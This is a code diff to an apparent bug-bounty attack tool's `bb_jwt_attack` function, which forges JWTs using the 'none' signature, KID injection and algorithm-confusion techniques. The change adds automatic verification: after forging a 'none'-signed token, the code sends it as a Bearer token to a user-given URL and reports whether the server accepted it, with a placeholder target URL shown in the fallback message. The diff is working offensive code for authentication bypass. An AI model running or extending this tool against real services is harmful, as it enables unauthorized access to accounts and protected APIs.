@@ -250,6 +250,7 @@ async def bb_jwt_attack(
     mode: str = "none",
     payload_override: Optional[str] = None,
     public_key: str = "",
+    verify_url: Optional[str] = None,
 ) -> str:
     """
     JWT 攻击 — None签名 / KID注入 / 算法混淆
@@ -259,6 +260,7 @@ async def bb_jwt_attack(
         mode: 攻击模式 (none / kid / algorithm_confusion)
         payload_override: 自定义 payload JSON（可选）
         public_key: 算法混淆所需公钥（PEM 格式）
+        verify_url: 验证URL（可选），生成伪造 Token 后自动发送请求验证是否绕过
 
     Returns:
         攻击生成的伪造 Token
@@ -289,7 +291,25 @@ async def bb_jwt_attack(
             result.append("[✓] None 签名 Token 生成成功:")
             result.append(f"  {forged}")
             result.append("")
-            result.append("[!] 将此 Token 替换原 Token 发送请求，验证是否绕过")
+            # 自动验证
+            if verify_url:
+                result.append("[*] 自动验证中...")
+                result.append(f"    GET {verify_url}")
+                try:
+                    from ..client import HttpClient
+                    client = HttpClient(timeout=10)
+                    resp = await client.get(verify_url, headers={"Authorization": f"Bearer {forged}"})
+                    if resp.status_code == 200:
+                        result.append(f"    [🔥 绕过成功] HTTP {resp.status_code} — 服务器接受了伪造 Token！")
+                    elif resp.status_code in (401, 403):
+                        result.append(f"    [✗ 绕过失败] HTTP {resp.status_code} — 服务器拒绝了伪造 Token")
+                    else:
+                        result.append(f"    [?] HTTP {resp.status_code} — 需要人工分析")
+                except Exception as ve:
+                    result.append(f"    [!] 验证请求异常: {ve}")
+            else:
+                result.append("[!] 将此 Token 替换原 Token 发送请求，验证是否绕过")
+                result.append(f"    或设置 verify_url=\"{verify_url if verify_url else 'https://target.com/api/protected'}\" 自动验证")
 
         elif mode == "kid":
             # KID 注入 — LFI
